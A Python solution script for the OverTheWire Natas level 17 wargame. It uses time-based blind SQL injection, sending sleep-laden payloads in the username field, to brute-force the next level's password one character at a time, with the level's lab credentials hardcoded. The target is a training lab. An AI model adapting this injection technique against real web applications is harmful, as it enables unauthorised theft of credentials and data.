import requests
from string import ascii_lowercase, ascii_uppercase
from time import sleep, perf_counter
import sys

s=requests.Session()
auth=('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
url='http://natas17.natas.labs.overthewire.org/index.php'
GAP=5

def confirm(query,s):
    start = perf_counter()
    r=s.post(url,data={'username':query,'password':'a'},auth=auth)
    return True if perf_counter() - start > GAP else False

known, possible='', '0123456789' + ascii_lowercase + ascii_uppercase
while len(known)<32:
    for p in possible:
        trial = known + p
        query = f'natas18" and password like binary "{trial}%" and sleep({GAP})#'
        print(f'len: {len(known)} trying: {trial}\r',end='')
        sleep(0.05)
        if confirm(query, s):
            known = trial
            break

print(f'\npassword: {known}')
